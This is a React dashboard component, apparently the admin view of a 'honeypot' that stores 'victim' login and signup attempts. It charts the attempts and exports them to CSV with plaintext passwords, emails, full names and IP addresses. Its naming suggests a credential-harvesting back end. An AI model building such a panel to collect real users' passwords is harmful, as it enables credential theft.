import React, { useState, useEffect, useCallback } from 'react';
import { DashboardHeader } from '../components/dashboard/DashboardHeader';
import { StatsCards } from '../components/dashboard/StatsCards';
import { AttemptsOverTime } from '../components/charts/AttemptsOverTime';
import { AttemptTypeDistribution } from '../components/charts/AttemptTypeDistribution';
import { TopUsernames } from '../components/charts/TopUsernames';
import { RecentAttempts } from '../components/dashboard/RecentAttempts';
import { VictimAttempt, DashboardStats } from '../types/database';
import { getAttempts, getStats, subscribeToAttempts } from '../lib/supabase';
import { logout } from '../lib/auth';

interface DashboardProps {
  onLogout: () => void;
}

export const Dashboard: React.FC<DashboardProps> = ({ onLogout }) => {
  const [attempts, setAttempts] = useState<VictimAttempt[]>([]);
  const [stats, setStats] = useState<DashboardStats>({
    totalAttempts: 0,
    uniqueUsers: 0,
    loginAttempts: 0,
    signupAttempts: 0,
    todayAttempts: 0
  });
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);

  // Memoize loadData to prevent unnecessary re-renders
  const loadData = useCallback(async () => {
    try {
      setError(null);
      const [attemptsData, statsData] = await Promise.all([
        getAttempts(500),
        getStats()
      ]);
      
      setAttempts(attemptsData);
      setStats(statsData);
    } catch (error) {
      console.error('Error loading dashboard data:', error);
      setError(error instanceof Error ? error.message : 'Failed to load dashboard data');
    } finally {
      setLoading(false);
    }
  }, []);

  useEffect(() => {
    loadData();
    
    // Subscribe to real-time updates
    const subscription = subscribeToAttempts((payload) => {
      console.log('New attempt detected:', payload);
      loadData();
    });

    return () => {
      subscription?.unsubscribe?.();
    };
  }, [loadData]);

  const handleLogout = useCallback(() => {
    logout();
    onLogout();
  }, [onLogout]);

  const handleExport = useCallback(() => {
    try {
      const csvContent = [
        ['ID', 'Username', 'Email', 'Password', 'Full Name', 'Attempt Type', 'IP Address', 'User Agent', 'Created At'],
        ...attempts.map(attempt => [
          attempt.id,
          attempt.username || '',
          attempt.email || '',
          attempt.password || '',
          attempt.full_name || '',
          attempt.attempt_type,
          attempt.ip_address || '',
          attempt.user_agent || '',
          attempt.created_at
        ])
      ].map(row => row.map(cell => `"${String(cell).replace(/"/g, '""')}"`).join(',')).join('\n');

      const blob = new Blob([csvContent], { type: 'text/csv;charset=utf-8' });
      const url = window.URL.createObjectURL(blob);
      const a = document.createElement('a');
      a.href = url;
      a.download = `nextech-honeypot-data-${new Date().toISOString().split('T')[0]}.csv`;
      a.style.display = 'none';
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      window.URL.revokeObjectURL(url);
    } catch (error) {
      console.error('Error exporting data:', error);
      setError('Failed to export data');
    }
  }, [attempts]);

  if (loading) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600 mx-auto mb-4"></div>
          <p className="text-gray-600">Loading dashboard...</p>
        </div>
      </div>
    );
  }

  if (error) {
    return (
      <div className="min-h-screen bg-gray-50 flex items-center justify-center">
        <div className="text-center">
          <div className="bg-red-100 border border-red-400 text-red-700 px-4 py-3 rounded mb-4">
            <p className="font-bold">Error loading dashboard</p>
            <p>{error}</p>
          </div>
          <button 
            onClick={loadData}
            className="bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 px-4 rounded"
          >
            Retry
          </button>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gray-50">
      <DashboardHeader onLogout={handleLogout} onExport={handleExport} />
      
      <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 pb-12">
        <StatsCards stats={stats} />
        
        <div className="grid lg:grid-cols-2 gap-8 mt-8">
          <AttemptsOverTime attempts={attempts} />
          <AttemptTypeDistribution attempts={attempts} />
        </div>
        
        <div className="grid lg:grid-cols-2 gap-8 mt-8">
          <TopUsernames attempts={attempts} />
          <RecentAttempts attempts={attempts} />
        </div>
      </div>
    </div>
  );
};